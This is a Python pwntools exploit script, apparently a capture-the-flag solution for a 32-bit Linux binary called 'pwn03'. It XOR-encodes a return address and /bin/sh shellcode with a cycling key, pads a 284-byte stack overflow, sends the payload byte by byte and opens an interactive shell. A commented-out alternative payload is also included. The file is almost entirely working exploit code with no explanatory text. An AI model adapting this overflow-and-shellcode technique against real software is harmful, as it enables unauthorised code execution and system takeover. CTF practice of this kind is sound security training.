from pwn import *


def encode(bfr, code, idx):
    def get_next(code, idx):
        if idx == len(code) - 1:
            return 0
        return idx + 1
    res = b''
    for ele in bfr:
        # print(code[idx], int(code[idx]))
        a = int.to_bytes(ele ^ int(code[idx]), byteorder='little', length=1)
        res += a
        idx = get_next(code, idx)
    return res


if __name__ == '__main__':
    context(os='linux', arch='i386', log_level='info')
    addr = './pwn03'
    p = process([addr])
    p.recvuntil(b'server\n')

    ending = b'ichunqiu'  # cycle
    shellcode = asm(shellcraft.sh())
    bfr_encode = p32(0x080bd877) + shellcode + b'a' * 4
    aft_encode = encode(bfr_encode, ending, 4)
    payload = b'a' * 284 + aft_encode + ending
    for ele in payload:
        a = int.to_bytes(ele, byteorder='little', length=1)
        p.send(a)
    # shellcode = asm(shellcraft.sh())
    # payload = b'A' * 212 + p32(0x0805b497) + shellcode
    # p.sendline(payload)
    p.interactive()
